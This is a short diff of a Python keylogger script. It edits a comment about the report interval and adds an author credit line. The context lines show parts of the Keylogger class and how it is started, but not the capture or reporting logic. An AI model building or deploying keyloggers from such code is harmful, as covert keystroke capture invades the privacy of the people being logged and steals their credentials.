@@ -8,7 +8,7 @@ from datetime import datetime
 with open("data.json", "r") as d:
     data = json.load(d)
     
-SEND_REPORT_EVERY = data["time"] # in seconds, 60 means 1 minute and so on
+SEND_REPORT_EVERY = data["time"] # in seconds, 60 means 1 minute, Default : 5 minutes
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
@@ -91,6 +91,8 @@ class Keylogger:
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
 
+
+# This Code is written by crypto-navdeep (www.github.com/crypto-navdeep)
 if __name__ == "__main__":
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     keylogger.start()
